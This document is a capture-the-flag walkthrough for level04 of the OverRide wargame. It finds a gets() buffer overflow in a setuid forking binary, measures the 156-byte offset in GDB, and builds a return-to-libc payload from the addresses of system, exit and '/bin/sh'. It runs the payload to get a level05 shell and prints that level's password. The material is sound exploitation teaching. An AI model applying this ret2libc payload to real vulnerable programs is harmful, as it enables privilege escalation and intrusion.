# Level04 Walkthrough
## Initial Analysis
### 1. Examine the Binary
```bash
level04@OverRide:~$ ls -la
total 17
dr-xr-x---+ 1 level04 level04   80 Sep 13  2016 .
dr-x--x--x  1 root    root     260 Oct  2  2016 ..
-rw-r--r--  1 level04 level04  220 Sep 10  2016 .bash_logout
lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
-rw-r--r--  1 level04 level04 3533 Sep 10  2016 .bashrc
-rwsr-s---+ 1 level05 users   7280 Sep 10  2016 level04
-rw-r--r--+ 1 level04 level04   41 Oct 19  2016 .pass
-rw-r--r--  1 level04 level04  675 Sep 10  2016 .profile
```
### 2. Test Basic Execution
```bash
level04@OverRide:~$ ./level04
Give me some shellcode, k
test
child is exiting...
```
## Reverse Engineering
### 3. Understanding the Program
The program:

Forks a child process

Child calls prctl() and ptrace() (anti-debugging)

Child uses gets() to read input - buffer overflow vulnerability

Parent monitors the child with wait() and ptrace()

Parent checks if the child tried to call exec() - if so, it blocks it

### 4. Finding the Offset with GDB
First, set GDB to follow the child process:

```bash
(gdb) set follow-fork-mode child
Then run with a pattern to find the offset:
```
```bash
(gdb) r
Starting program: /home/users/level04/level04 
[New process 1739]
Give me some shellcode, k
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz

Program received signal SIGSEGV, Segmentation fault.
0x6e6e6e6e in ?? ()
```
The crash at 0x6e6e6e6e ("nnnn") gives us the offset:
```bash
./get_offset.py 6e6e6e6e
nnnn => offset = 156
```
### 5. Finding libc Addresses
Since NX is enabled? Actually checksec shows:

```text
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level04/level04
NX is disabled, but the parent blocks exec(), so we need a different approach - return-to-libc.
Find the address of system():

(gdb) info function system
....
0xf7e6aed0  system
Find the address of exit():

(gdb) info function exit
....
0xf7e5eb70  exit
Find the address of /bin/sh in libc:

(gdb) find 0xf7e2c000,0xf7fcc000,"/bin/sh"
0xf7f897ec
1 pattern found.

(gdb) x/s 0xf7f897ec
0xf7f897ec:      "/bin/sh"
```
### 6. The Payload Structure
```text
[156 bytes padding] + [system() address] + [exit() address] + ["/bin/sh" address]
156 bytes: Padding to reach the return address

system(): 0xf7e6aed0 → \xd0\xae\xe6\xf7 (little-endian)

exit(): 0xf7e5eb70 → \x70\xeb\xe5\xf7 (little-endian) - used as fake return

"/bin/sh": 0xf7f897ec → \xec\x97\xf8\xf7 (little-endian) - argument for system
```

### 7. The Exploit
```bash
level04@OverRide:~$ python -c 'print "B"*156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"' > /tmp/payload

level04@OverRide:~$ (cat /tmp/payload; cat) | ./level04
Give me some shellcode, k
whoami
level05
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```